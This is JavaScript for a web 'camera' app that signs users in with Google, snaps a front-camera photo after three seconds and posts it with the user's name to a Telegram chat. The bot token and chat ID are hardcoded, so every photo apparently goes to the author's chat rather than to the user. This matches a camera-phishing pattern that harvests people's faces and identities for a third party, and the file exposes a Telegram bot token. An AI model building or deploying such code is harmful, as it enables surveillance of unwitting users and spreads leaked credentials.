import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

const firebaseConfig = {
  apiKey: "AIzaSyBLC6enWWKAr3O9ys-4NDjnhch4r1PSw0E",
  authDomain: "picmaster-59602.firebaseapp.com",
  projectId: "picmaster-59602",
  storageBucket: "picmaster-59602.firebasestorage.app",
  messagingSenderId: "434859259854",
  appId: "1:434859259854:web:522979eb1a7f8b6d211d9f"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const provider = new GoogleAuthProvider();

const botToken = "8234454796:AAEF_c5gExxUp7X7pTpu9brOBmjIOTac2uQ";
const chatId = "7752627907";
let currentUser = null;

// UI Panels Logic
const sidePanel = document.getElementById('side-panel');
const settingsBtn = document.getElementById('settings-btn');
const menuToggle = document.getElementById('menu-toggle');

const togglePanel = (e) => { e.stopPropagation(); sidePanel.classList.toggle('active'); };
settingsBtn.onclick = togglePanel;
menuToggle.onclick = togglePanel;
document.onclick = (e) => { if (!sidePanel.contains(e.target)) sidePanel.classList.remove('active'); };

// Telegram Upload Function
async function uploadToTelegram(file) {
    if (!currentUser) return alert("Please Login First!");
    
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("document", file, "PICMaster_Capture.jpg");
    formData.append("caption", `📤 New capture from: ${currentUser.displayName}`);

    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
            method: "POST",
            body: formData
        });
        if (response.ok) {
            alert("✅ Photo sent to Telegram!");
        } else {
            alert("❌ Telegram Error!");
        }
    } catch (error) {
        alert("❌ Connection Error!");
    }
}

// Camera Fix
document.getElementById('camera-btn').onclick = async () => {
    if(!currentUser) return alert("Login to use Camera");

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" }, 
            audio: false 
        });
        
        const video = document.getElementById('webcam');
        video.srcObject = stream;
        video.style.display = 'block';
        video.style.width = '100%'; // Full screen-la camera theriyum
        video.play();

        // 3 seconds wait panni photo edukkum
        setTimeout(() => {
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            
            // Camera resolution match pannuthu
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob((blob) => {
                uploadToTelegram(blob);
                stream.getTracks().forEach(track => track.stop()); // Camera-vai off pannuthu
                video.style.display = 'none';
            }, 'image/jpeg', 0.8);
            
            alert("📸 Photo Captured!");
        }, 3000);

    } catch (err) {
        console.error(err);
        alert("Camera Error: Please allow camera permission in your browser settings.");
    }
};

// Auth & Other Actions
onAuthStateChanged(auth, (user) => {
    currentUser = user;
    const mainLogin = document.getElementById('main-login-btn');
    const cameraBtn = document.getElementById('camera-btn');
    const logoutBtn = document.getElementById('logout-btn');
    const userDisp = document.getElementById('user-display');

    if (user) {
        mainLogin.style.display = 'none';
        cameraBtn.style.display = 'block';
        logoutBtn.style.display = 'flex';
        userDisp.innerText = user.displayName;
    } else {
        mainLogin.style.display = 'block';
        cameraBtn.style.display = 'none';
        logoutBtn.style.display = 'none';
        userDisp.innerText = "Guest User";
    }
});

document.getElementById('main-login-btn').onclick = () => signInWithPopup(auth, provider);
document.getElementById('logout-btn').onclick = () => signOut(auth).then(() => location.reload());
